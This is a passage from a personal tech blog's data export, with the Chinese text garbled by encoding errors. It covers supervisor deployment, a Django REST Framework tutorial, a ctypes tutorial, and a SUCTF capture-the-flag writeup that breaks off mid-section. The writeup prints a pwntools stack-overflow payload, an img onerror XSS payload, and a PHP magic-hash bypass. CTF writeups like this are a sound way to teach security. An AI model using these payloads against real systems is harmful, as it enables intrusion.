æ­£åœ¨è¿è¡Œï¼Œä¸è¿‡ç°åœ¨è¿˜æ²¡æœ‰é…ç½®ä»»ä½•æœåŠ¡ã€‚åŒç†ï¼Œå¯ä»¥ä½¿ç”¨ supervisorctl ç¨‹åºï¼Œæ¥æŸ¥çœ‹æœåŠ¡è¿è¡ŒçŠ¶æ€ã€‚ 3. æœåŠ¡æ‰˜ç®¡ 3.1 æ‰˜ç®¡ä¸€ä¸ª Django åº”ç”¨è¿›å…¥ conf.d æ–‡ä»¶å¤¹ï¼Œåˆ›å»ºé…ç½®æ–‡ä»¶ï¼ˆå¦‚ baybook.confï¼‰ã€‚1234567891011[program:baybook]command = gunicorn baybook.wsgi -b 127.0.0.1:8002 -n baybook ; è¿è¡Œå‘½ä»¤directory = /home/stdio/websites/baybook ; è¿è¡Œè·¯å¾„user = stdioautostart = trueautorestart = truestartsecs = 5startretries = 3stdout_logfile = /var/log/supervisor/baybook_stdout.logstderr_logfile = /var/log/supervisor/baybook_stderr.logenvironment=DJANGO_SETTINGS_MODULE=\"baybook.settings.production\"å…¶ä¸­ï¼Œenvironment é€‰é¡¹å¯ä»¥é…ç½®è¿è¡Œç¯å¢ƒçš„ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚åœ¨æ­¤å¤„æ›´æ”¹äº† Django çš„é…ç½®æ–‡ä»¶é€‰é¡¹ï¼›startsecs é€‰é¡¹è¡¨ç¤ºæ­£å¸¸å¯åŠ¨æ‰€éœ€çš„æ—¶é—´ï¼Œæ¯”å¦‚ï¼Œå½“ç¨‹åºå·²æŒç»­è¿è¡Œè¶…è¿‡ 5 ç§’æ—¶ï¼Œåˆ™è§†ä¸ºç¨‹åºå¯åŠ¨æˆåŠŸã€‚å…·ä½“çš„é…ç½®é€‰é¡¹å¯ä»¥æŸ¥çœ‹æ–‡æ¡£ã€‚ä¿å­˜æ–‡ä»¶åï¼Œè¿è¡Œ supervisorctl update ä½¿é…ç½®ç”Ÿæ•ˆã€‚éšåå¯ä»¥è¾“å…¥ supervisorctl status æ¥æŸ¥çœ‹é…ç½®çŠ¶æ€ã€‚12$ sudo supervisorctl statusbaybook RUNNING pid 7658, uptime 1:19:55supervisor æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼Œç›´æ¥è¾“å…¥ supervisorctl å³å¯è¿›å…¥ï¼Œéšåå¯ä»¥è¾“å…¥ä¸€ç³»åˆ—å‘½ä»¤ï¼Œå¦‚ start, stop, status, restart æ¥æŸ¥çœ‹å’Œæ§åˆ¶æœåŠ¡è¿è¡ŒçŠ¶æ€ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨ Web ç®¡ç†é¡µé¢ä¸­ï¼ŒæŸ¥çœ‹åŠæ§åˆ¶æœåŠ¡çš„è¿è¡ŒçŠ¶æ€ã€‚ 3.2 æ‰˜ç®¡ Node åº”ç”¨Node å’Œ Django çš„é…ç½®æ–‡ä»¶åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡ï¼Œå› ä¸ºæˆ‘çš„ node åº”ç”¨ çš„å¯åŠ¨é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥æˆ‘æŠŠ startsecs è°ƒé«˜åˆ°äº† 30 ç§’ã€‚ 3.3 æ‰˜ç®¡ Flask åº”ç”¨å› ä¸ºæˆ‘çš„ Flask åº”ç”¨è¿è¡Œåœ¨ virtualenv åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒä¸­ï¼Œæ‰€ä»¥ command å‘½ä»¤è¦ç¨å¾®æ”¹ä¸€ä¸‹ï¼Œå°† gunicorn å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ”¹ä¸ºè™šæ‹Ÿç¯å¢ƒä¸­çš„ gunicorn ç»å¯¹è·¯å¾„ï¼Œå¦‚ /home/stdio/websites/crypt/venv/bin/gunicorn. 4. åè®°å¥½åƒå¯å†™çš„å°±è¿™ä¹ˆå¤šâ€¦ä»¥åç ”ç©¶ä¸€ä¸‹ gunicornï¼Œå†è¡¥å…… gunicorn çš„ç›¸å…³å†…å®¹å§ã€‚","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.stdioa.com/categories/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"supervisor","slug":"supervisor","permalink":"https://blog.stdioa.com/tags/supervisor/"},{"name":"gunicorn","slug":"gunicorn","permalink":"https://blog.stdioa.com/tags/gunicorn/"}]},{"title":"Django REST Framework å…¥é—¨","slug":"DRF-demo","date":"2017-03-09T06:52:00.000Z","updated":"2018-04-23T13:37:52.809Z","comments":true,"path":"2017/03/DRF-demo/","link":"","permalink":"https://blog.stdioa.com/2017/03/DRF-demo/","excerpt":"æ‹–äº†å¾ˆä¹…ï¼Œç»ˆäºç”¨ Django REST Framework å†™äº†ä¸ªå° Demo.","text":"æ‹–äº†å¾ˆä¹…ï¼Œç»ˆäºç”¨ Django REST Framework å†™äº†ä¸ªå° Demo. 1. Django REST FrameworkDjango REST Framework æ˜¯ä¸€ä¸ªç”¨æ¥æ„é€  Web API çš„ã€å¼ºå¤§è€Œçµæ´»çš„å·¥å…·åŒ…ã€‚æœ€æ—©è®¤è¯†è¿™ä¸ªæ¡†æ¶æ˜¯åœ¨æˆ‘ç¿»è¯‘çš„ã€Š5 ä¸ªæœ€å—äººå–œçˆ±çš„å¼€æº Django åŒ…ã€‹ä¸­ï¼Œè€ŒçœŸæ­£æ¥è§¦å®ƒçš„æ—¶å€™å·²ç»æ˜¯åœ¨äº”ä¸ªæœˆä¹‹åã€‚é‚£ä¸ªæ—¶å€™åœ¨æ‰‡è´å®ä¹ ï¼Œç¬¬ä¸€æ¬¡ä½“ä¼šåˆ°äº†è¿™ä¸ªæ¡†æ¶çš„ç®€å•æ˜“ç”¨ã€‚ä½†é‚£ä¸ªæ—¶å€™ä¹Ÿä»…ä»…æ˜¯åšç å†œå †ä»£ç ï¼Œå¹¶æ²¡æœ‰å¯¹è¿™ä¸ªæ¡†æ¶äº§ç”Ÿç‰¹åˆ«æ·±çš„äº†è§£ã€‚å‰ä¸¤å¤©å†™äº†ä¸€ä¸ªå° Demoï¼Œå°è¯•ç€ç”¨æ¯”è¾ƒå°‘çš„ä»£ç å®ç°å¯¹æŸä¸ªæ¨¡å‹çš„å¢åˆ æ”¹æŸ¥æ“ä½œï¼Œä»Šå¤©ç®€å•æŠŠå®ç°è¿‡ç¨‹è®°å½•ä¸€ä¸‹ã€‚å®Œæ•´çš„ä»£ç åœ¨è¿™é‡Œã€‚ 2. ä¸€ç‚¹å‡†å¤‡å·¥ä½œå…ˆå®‰è£…ä¾èµ–ï¼ˆæ¨èä½¿ç”¨ virtualenvï¼Œè™½ç„¶æˆ‘ä»æ¥ä¸ç”¨ğŸŒšï¼‰ï¼špip install Django djangorestframework.ç„¶ååˆ›å»ºå·¥ç¨‹ï¼Œåˆ›å»º app.123django-admin startproject drf_democd drf_demo./manage.py startapp demoç®€å•å†™ä¸€ä¸ª modelï¼š12345# demo/models.pyfrom django.db import models class Data(models.Model): content = models.CharField(max_length=128)è¿ç§»æ•°æ®åº“ï¼š12./manage.py makemigrations./manage.py migrateåœ¨é¡¹ç›®è®¾ç½®ä¸­æ·»åŠ  APPï¼Œé¡ºä¾¿æŠŠ DRF ä¹Ÿæ·»åŠ è¿›å»ï¼š123456# drf_demo/settings.pyINSTALLED_APPS = [ # ... 'rest_framework', 'demo']åœ¨ root URL conf ä¸­æ·»åŠ  APP çš„ URLï¼š12345# drf_femo/urls.pyurlpatterns = [ # ... url(r'^', include('demo.urls'))] 3. å¼€å§‹åŠ¨æ‰‹å†™ APIå¦‚æœåœ¨ Django ä¸­å†™ä¸€ä¸ªé¡µé¢ï¼Œä½ éœ€è¦ï¼šåœ¨ urls.py ä¸­æ³¨å†Œ viewï¼›åœ¨ views.py ä¸­ç¼–å†™ viewï¼›åœ¨ templates æ–‡ä»¶å¤¹ä¸­ç¼–å†™æ¨¡æ¿ã€‚ç›¸å¯¹åœ°ï¼Œå¦‚æœä½¿ç”¨ DRF åˆ›å»ºä¸€ç»„ APIï¼Œä½ éœ€è¦ï¼šåœ¨ urls.py ä¸­å®šä¹‰å¹¶æ³¨å†Œ routerï¼›åœ¨ views.py ä¸­å®šä¹‰ ViewSetï¼›åœ¨ serializers.py ä¸­å®šä¹‰ serializer. 3.1 åˆ›å»º serializerserializer æ˜¯ä»€ä¹ˆï¼Ÿç®€å•è€Œè¨€ï¼Œserializer å°±æ˜¯ä¸€ç§æ ¹æ®é…ç½®ï¼Œç”¨æ¥æŠŠæ•°æ®åœ¨ model instance åŠ raw data ä¹‹é—´è½¬æ¢çš„å¯¹è±¡ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬å¯ä»¥é’ˆå¯¹åˆšåˆšå®šä¹‰çš„ model Data æ¥åˆ›å»ºä¸€ä¸ª serializer:123456789# demo/serializers.pyfrom .models import Datafrom rest_framework.serializers import ModelSerializer class DataSerializer(ModelSerializer): class Meta: model = Data fields = (\"id\", \"content\")ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ª serializer å°†æ•°æ®åœ¨ Data å¯¹è±¡åŠ JSON æ•°æ®ä¹‹é—´è½¬æ¢ï¼š123456789101112131415161718from demo.serializers import Data, DataSerializerfrom rest_framework.renderers import JSONRenderer # ç”¨äº JSON æ¸²æŸ“åŠè§£æfrom rest_framework.parsers import JSONParserfrom django.utils.six import BytesIO instance = Data(content=\"test\")instance.save() serializer = DataSerializer(instance)JSONRenderer().render(serializer.data) # b'&#123;\"id\":1,\"content\":\"test\"&#125;' raw = b'&#123;\"id\":2,\"content\":\"another\"&#125;'stream = BytesIO(raw) # å°† JSON æ•°æ®å˜æˆ Python dictdata = JSONParser().parse(stream) serializer = DataSerializer(data=data)ins = serializer.save() # &lt;Data: Data object&gt;ins.__dict__ # &#123;'content': 'another', 'id': 2&#125; 3.2 åˆ›å»º ViewSetéå¸¸ç®€å•ï¼Œåœ¨ views.py ä¸­å®šä¹‰ä¸€ä¸ª ViewSet ç±»ï¼Œæ ‡æ˜å¯¹åº”çš„ model ä»¥åŠ serializer å³å¯ï¼š123456789# demo/views.pyfrom rest_framework.viewsets import ModelViewSetfrom .models import Datafrom .serializers import DataSerializer class DataViewSet(ModelViewSet): queryset = Data.objects.all() serializer_class = DataSerializer 3.3 å®šä¹‰ã€é…ç½®å¹¶æ³¨å†Œ router1234567891011# demo/urls.pyfrom django.conf.urls import url, includefrom rest_framework.routers import DefaultRouterfrom .views import DataViewSet router = DefaultRouter() # å®šä¹‰ routerrouter.register('data', DataViewSet) # æ³¨å†Œ viewset urlpatterns = [ url(r'^', include(router.urls)), # åœ¨ urlpatterns é‡ŒåŒ…å« router] 4. å¤§åŠŸå‘Šæˆï¼å¯åŠ¨æœåŠ¡å™¨ï¼Œè®¿é—® /data/ï¼Œä½ å°±ä¼šçœ‹åˆ° DRF ç²¾ç¾çš„è°ƒè¯•ç•Œé¢ï¼ŒçœŸæ˜¯æ„ŸåŠ¨ğŸ˜­æŒ‰ç…§ RESTful API è§„èŒƒï¼Œåœ¨åˆ—è¡¨ç•Œé¢ï¼Œä½ å¯ä»¥é€šè¿‡ POST è¡¨å•æ¥åˆ›å»ºæ–°å¯¹è±¡ï¼šåœ¨è¯¦æƒ…ç•Œé¢ï¼ˆ/data/1/ï¼‰ï¼Œä½ å¯ä»¥é€šè¿‡ PUT è¡¨å•ä¿®æ”¹å¯¹è±¡ï¼Œæˆ–é€šè¿‡ DELETE æŒ‰é’®æ¥åˆ é™¤å¯¹è±¡:å½“ç„¶ï¼Œå¦‚æœä½ ä¹æ„ï¼Œä½¿ç”¨ CURL æ¥è°ƒè¯•ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒæœåŠ¡å™¨ä¼šç»™ä½ è¿”å› JSON è€Œä¸æ˜¯ HTML:12$ curl -XPUT --data \"content=edit\" http://localhost:8000/data/1/&#123;\"id\":1,\"content\":\"edit\"&#125; 5. ç­‰ç­‰â€¦åˆ«å¿˜äº†å†™æµ‹è¯•ï¼DRF æä¾›äº†ä¸€ç³»åˆ—å·¥å…·æ¥ååŠ© RESTful API æµ‹è¯•ï¼Œæ¯”å¦‚ rest_framework.test.APIClient. APIClient åœ¨å‘é€è¯·æ±‚æ—¶ä¼šæ ¹æ®é…ç½®è‡ªåŠ¨è®¾å®š Content-Type, è€Œä¸æ˜¯ç”¨ Django è‡ªå¸¦ djanto.test.Client çš„ application/octet-streamï¼Œæ–¹ä¾¿äº† API æµ‹è¯•ã€‚æµ‹è¯•ä»£ç ä¸åœ¨è¿™é‡Œè´´å‡ºï¼ˆæœ‰äº›æ— è¶£ï¼‰ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥æˆ³æˆ³æˆ³è¿™é‡Œã€‚æ•™ç¨‹ç»“æŸã€‚è¿™ä¸¤å¤©æˆ‘è¿˜ä¼šç»§ç»­çœ‹ DRFï¼Œåé¢è¿˜ä¼šç»§ç»­æ›´æ–°ç›¸å…³å†…å®¹ã€‚æ›´æ–°â€¦ç„¶è€Œå¹¶æ²¡æœ‰æ›´æ–°ã€‚æˆ‘çœ‹å®Œäº† DRF çš„ tutorialï¼Œä¹Ÿåœ¨æŸä¸ªé¡¹ç›®é‡Œç¢°åˆ°äº†å‘/éš¾ç”¨çš„åœ°æ–¹ï¼Œä¸è¿‡è¿™äº›éƒ½æ²¡æœ‰å¤ªå¤šå¯å†™çš„åœ°æ–¹ï¼Œæ‰€ä»¥å°±ç®—äº†å§ï¼Œé‡åˆ°é—®é¢˜ç¿»æ–‡æ¡£å°±å¥½ï¼ŒDRF çš„æ–‡æ¡£å†™çš„è¿˜æ˜¯æŒºä¸é”™çš„ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"Django REST Framework","slug":"Django-REST-Framework","permalink":"https://blog.stdioa.com/tags/Django-REST-Framework/"}]},{"title":"Python å­¦ä¹ ä¹‹ ctypes","slug":"learning-python-ctypes","date":"2016-12-30T03:27:00.000Z","updated":"2017-06-29T04:38:40.869Z","comments":true,"path":"2016/12/learning-python-ctypes/","link":"","permalink":"https://blog.stdioa.com/2016/12/learning-python-ctypes/","excerpt":"è¯¾è®¾å†™ä¸å®Œï¼Œè¦ç‚¸äº†â€¦ Windows UI å¥½éš¾å†™ï¼Œåªå¥½ç”¨ PyQt è§£å†³â€¦ æ€ä¹ˆæŠŠ Python å’Œ C æ¨¡å—è¿èµ·æ¥ï¼Ÿå°±ç”¨ ctypes.","text":"è¯¾è®¾å†™ä¸å®Œï¼Œè¦ç‚¸äº†â€¦ Windows UI å¥½éš¾å†™ï¼Œåªå¥½ç”¨ PyQt è§£å†³â€¦ æ€ä¹ˆæŠŠ Python å’Œ C æ¨¡å—è¿èµ·æ¥ï¼Ÿå°±ç”¨ ctypes. 1. ç®€ä»‹ctypes æ˜¯ä¸€ä¸ª Python å¤–éƒ¨åº“ã€‚å®ƒæä¾› C è¯­è¨€å…¼å®¹çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨ DLL æˆ–å…±äº«åº“(shared library)çš„å‡½æ•°ã€‚ 2. å¿«é€Ÿä¸Šæ‰‹ç¼–å†™ mod.c:12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; int add(int a, int b)&#123; return a+b;&#125; char *hello(char *name)&#123; char *str; str = (char *)malloc(100); sprintf(str, \"Hello, %s\", name); return str;&#125;å°† C ç¨‹åºç¼–è¯‘ä¸ºå…±äº«åº“ï¼šgcc -fPIC -shared mod.c -o mod.soç¼–å†™ Python ä»£ç ï¼š1234567891011121314# coding: utf-8from ctypes import * mod = CDLL(\"./mod.so\") print(mod.add(1, 2)) # 3 hello = mod.hellohello.restype = c_char_p # Set response type, # otherwise an address(integer) will be returned world = create_string_buffer(b\"World\")res = hello(byref(world)) # Pass by pointerprint(res)å®Œã€‚å‰©ä¸‹çš„ç­‰å†™å®Œè¯¾è®¾å†æ›´ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"ctypes","slug":"ctypes","permalink":"https://blog.stdioa.com/tags/ctypes/"}]},{"title":"SUCTF éå®˜æ–¹ Writeup","slug":"SuCTF-Writeup","date":"2016-11-15T11:23:58.000Z","updated":"2018-06-06T07:55:13.895Z","comments":true,"path":"2016/11/SuCTF-Writeup/","link":"","permalink":"https://blog.stdioa.com/2016/11/SuCTF-Writeup/","excerpt":"åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚","text":"åˆç©äº†ä¸€åœº CTFï¼Œè™½ç„¶æ˜¯ä¸ªäººèµ›ï¼Œä½†æ˜¯æœ‰è€å¸æœºå¸¦æˆ‘é£ã€‚ç»§ç»­å¼€è„‘æ´ï¼Œä¹Ÿå­¦åˆ°äº†ä¸å°‘ï¼Œåšäº†å¾ˆå¤šä¹‹å‰æ²¡åšè¿‡çš„é¢˜ã€‚ PWN è¿™æ˜¯ä½  hello pwnï¼Ÿæ–‡ä»¶åœ¨è¿™é‡Œã€‚åç¼–è¯‘å¾—åˆ° main å’Œ getflag å‡½æ•°ï¼š12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); write(1, \"let's begin!\\n\", 0xDu); read(0, &amp;v4, 0x100u); return 0;&#125; //----- (0804865D) --------------------------------------------------------int getflag()&#123; char format; // [sp+14h] [bp-84h]@4 char s1; // [sp+28h] [bp-70h]@3 FILE *v3; // [sp+8Ch] [bp-Ch]@1 v3 = fopen(\"flag.txt\", \"r\"); if ( !v3 ) exit(0); printf(\"the flag is :\"); puts(\"SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;\"); puts(\"now,this chengxu wil tuichu.........\"); printf(\"pwn100@test-vm-x86:$\"); __isoc99_scanf(\"%s\", &amp;s1); if ( strcmp(&amp;s1, \"zhimakaimen\") ) exit(0); __isoc99_fscanf(v3, \"%s\", &amp;format); return printf(&amp;format);&#125;å¯ä»¥çœ‹å‡ºè¿™ä¸ªé¢˜éœ€è¦è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ä¸»å‡½æ•°çš„è¿”å›åœ°å€å˜ä¸º 0x0804865D, è·³è‡³ getflag å‡½æ•°, ç„¶åè¾“å…¥ â€œzhimakaimenâ€ å¾—åˆ° flag. ç¼–å†™ payloadï¼š123456from pwn import * r = remote('xxx.xxx.xxx.xxx', 10000)r.send('A' * 112 + '\\x5d\\x86\\x04\\x08')r.interactive()æœ€åå¾—åˆ° flag: SUCTF{5tack0verTlow_!S_s0_e4sy}.ç®€å•çš„æ ˆæº¢å‡ºæ”»å‡»ï¼Œæˆ‘åšçš„ç¬¬ä¸€é“ PWN é¢˜ã€‚ä¸€å¼€å§‹ä¸çŸ¥é“ pwntool, ç”¨ socket å†™äº†ä¸€å¤§å †ä»£ç ï¼Œç®€ç›´é†‰äººã€‚ Web flag åœ¨å“ªï¼Ÿåœ¨ Cookie é‡Œã€‚HTTP å“åº”å¤´å¸¦æœ‰ Cookie: flag=suctf%7BThi5_i5_a_baby_w3b%7D å­—æ®µã€‚ ç¼–ç éƒ½è¯´äº†æ˜¯ç¼–ç ï¼Œæ‰¾å§ã€‚HTTP å“åº”å¤´éƒ¨æœ‰ Password: VmxST1ZtVlZNVFpVVkRBOQ==ï¼Œbase64 è§£ç ä¸‰æ¬¡å¾—å‡º Su233ï¼Œæäº¤è‡³ç½‘é¡µå¾—åˆ° flag. ç„¶è€Œç½‘é¡µä¸Šçš„æäº¤æŒ‰é’®æ˜¯å‡çš„ğŸ˜‚å¥½å§ï¼Œåæ­£è¡¨å• method æ˜¯ GETï¼Œä» URL é‡Œè¾“è¿›å»å°±è¡Œäº†ã€‚æœ€åå¾—åˆ° flag: suctf{Su_is_23333} XSS1XSS è¿‡æ»¤äº† &lt;script&gt; æ ‡ç­¾ã€‚è¯•è¯• img å§ã€‚æäº¤ Payload &lt;img src=# onerror=alert(1)&gt;ï¼Œå¾—åˆ° flag suctf{too_eaSy_Xss}. PHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ç½‘é¡µå†…å®¹ä¸ºç©ºï¼ŒæŸ¥çœ‹æºç å¾—åˆ° php:1234if(isset($_GET[\"password\"]) &amp;&amp; md5($_GET[\"password\"]) == \"0\") echo file_get_contents(\"/opt/flag.txt\");else echo file_get_contents(\"xedni.php\");MD5 == &quot;0&quot;ï¼Œä»¥å‰åšè¿‡è¿™é“é¢˜ï¼Œæ‰¾ä¸ª MD5 å¼€å¤´æ˜¯ 0e çš„å­—ç¬¦ä¸²å°±è¡Œäº†ï¼Œæ¯”å¦‚ s878926199aã€‚æäº¤å¾—åˆ° flag: suctf{PHP_!s_the_bEst_1anguage}.å°¼ç›ï¼Œå­—ç¬¦ä¸²å½“æ•°å­—æ¯”ï¼ŒPHP çœŸæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å•Šã€‚ ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯ç»™äº†ä¸€é•¿ä¸²é¢œæ–‡å­—ï¼Œè·‘ä¸ªæ§åˆ¶å°å§ï¼Œç«Ÿç„¶ alert å‡ºä¸€æ®µ Brainfuck ğŸŒšå¥½å§ï¼Œæ‰¾ä¸ª AAEncode è§£ç å™¨ï¼ŒæŠŠæ··æ·†ä¹‹å‰çš„ä»£ç è§£å‡ºæ¥å°±è¡Œäº†ï¼Œç„¶åæ‰¾ä¸ª Brainfuck è§£é‡Šå™¨è·‘ä¸€ä¸‹ï¼Œå¾—åˆ° flag: suctf{aAenc0de_and_bra1nf**k}. ä½ æ˜¯è°ï¼Ÿä½ ä»å“ªé‡Œæ¥ï¼Ÿä»¥å‰åšè¿‡äº†ï¼Œæ”¹ HTTP è¯·æ±‚å¤´éƒ¨çš„ Origin å’Œ X-Forwarded-For å­—æ®µå³å¯ã€‚å¾—åˆ° flag: suctf{C0ndrulation!_y0u_f1n1shed}. XSS2çœ‹äº†åˆ«äººçš„ Writeupï¼Œéº»è›‹è¿™ç«Ÿç„¶æ˜¯é“éšå†™ï¼ŸæŠŠ URL ä¸­çš„ xss2.php å»æ‰ç«Ÿç„¶èƒ½æŠŠç›®å½•åˆ—å‡ºæ¥â€¦é‡Œé¢æœ‰ä¸ª TIFF æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œæœ‰ flagâ€¦ è‚ å­æœæ‚”é’äº†ğŸ˜¢ Mobile æœ€åŸºç¡€çš„å®‰å“é€†å‘é¢˜æ–‡ä»¶åœ¨è¿™å„¿ã€‚å…ˆç”¨ dex2jar è§£å‡º jar åŒ…ï¼Œç„¶åç”¨ jd-gui åç¼–è¯‘ï¼Œæœ€åå‘ç° flag åœ¨ MainActivity é‡Œï¼šsuctf{Crack_Andr01d+50-3asy} Mob200æ–‡ä»¶ã€‚åç¼–è¯‘ä»¥åæ”¹ä»£ç ï¼ŒæŠŠåŠ å¯†è¿‡ç¨‹é€†è¿‡æ¥ï¼Œæ”¾åˆ°å®‰å“ç³»ç»Ÿé‡Œè·‘ä¸€ä¸‹å°±èƒ½å‡ºç»“æœã€‚ç„¶è€Œ Android Studio è·Ÿæˆ‘æœ‰ä»‡â€¦ å·¥ç¨‹è·‘ä¸èµ·æ¥ï¼Œç®—äº†ã€‚ mipsæ–‡ä»¶ã€‚æ‰¾äº†ä¸ªåœ¨çº¿åç¼–è¯‘çš„ç½‘ç«™ https://retdec.com/decompilation/ å»åç¼–è¯‘ï¼Œå¾—åˆ°ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; char * g1 = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; // 0x410aa0 int main(int argc, char ** argv) &#123; int32_t str = 0; // bp-52 int32_t str2 = 0; // bp-32 printf(\"Input Key:\"); scanf(\"%16s\", &amp;str); int32_t v1 = 0; // bp-56 if (strlen((char *)&amp;str) == 0) &#123; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0; &#125; int32_t v2 = 0; // 0x4008148 int32_t v3 = v2 + (int32_t)&amp;v1; // 0x4007c0 unsigned char v4 = *(char *)(v3 + 4); // 0x4007c4 *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; while (v1 &lt; strlen((char *)&amp;str)) &#123; v2 = v1; v3 = v2 + (int32_t)&amp;v1; v4 = *(char *)(v3 + 4); *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; &#125; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0;&#125;é‡Œé¢æœ‰å„ç§æŒ‡é’ˆæ“ä½œï¼Œä¸è¿‡ä¹Ÿä¸éº»çƒ¦ï¼Œå•ƒä¸€ä¸‹å°±å¥½å•¦ã€‚ç¼–å†™è§£å¯†ç¨‹åºï¼š12345678char g[] = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; int main() &#123; for (int i = 0; i &lt; strlen(g); i++) &#123; printf(\"%c\", g[i] ^ i); &#125; printf(\"\\n\");&#125;å¾—åˆ° flag: suctf{X0r_1s_n0t_h4rd}.ä¸€å¼€å§‹åœ¨æƒ³ï¼Œä¸ºå•¥ mips è¦æ”¾åœ¨ Mobile é‡Œï¼Ÿåæ¥æƒ³åˆ°æœ‰äº›è·¯ç”±å™¨æ˜¯ mips æ¶æ„çš„ï¼Œæ²¡æ¯›ç—…ã€‚ Mob300æ–‡ä»¶ã€‚è§£å‹ apkï¼Œèƒ½çœ‹åˆ°é‡Œé¢çš„åŠ¨æ€é“¾æ¥åº“ã€‚éšä¾¿æ‰¾äº†ä¸ª x86 çš„ï¼Œåç¼–è¯‘å‡ºæ¥ï¼Œåœ¨é‡Œé¢æ‰¾å„ç§å¸¸é‡ï¼Œæœ€åæ‰¾åˆ°äº†å‡ æ®µå­—ç¬¦ä¸²æ‹¼èµ·æ¥çš„ flag: suctf{Meet_jni_50_fun}.è¿™ä¸ªé¢˜ä¹Ÿåƒæ˜¯é€†å‘â€¦ Misc ç­¾åˆ°Misc çš„é¢˜æœ€å¥½ç©å•¦ã€‚é¢˜ç›®ä¸Šç»™äº†ä¸ª QQ ç¾¤ï¼ŒåŠ è¿›å»ï¼Œç¾¤æ–‡ä»¶é‡Œæœ‰ flag.txt.suctf{Welc0me_t0_suCTF} Misc-50é¢˜ç›®ç»™äº†ä¸ª è¶…å¤§çš„ GIFï¼Œä¸€ä¸ªé•¿æ¡ï¼Œçœ‹äº†åŠå¤©æ²¡çœ‹å‡ºæ‰€ä»¥ç„¶æ¥ã€‚åæ¥æƒ³äº†æƒ³ï¼Œå¯èƒ½æ˜¯æ¯ä¸€å¸§æ‹¼èµ·æ¥èƒ½æåˆ° flagï¼Œäºæ˜¯å†™äº†ä¸ªç¨‹åºæ‹¼äº†ä¸€ä¸‹ã€‚1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import osfrom PIL import Image def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' final_img = Image.new('RGBA', (7*71, 750)) mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) final_img.paste(new_frame, (7*i, 0)) i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass return final_img def main(): final_img = processImage('Misc-50.gif') final_img.save(\"Misc-50-final.png\") if __name__ == \"__main__\": main()å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œé‡Œé¢æœ‰ flag: suctf{t6cV165qUpEnZVY8rX} Forensic-100ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶, file 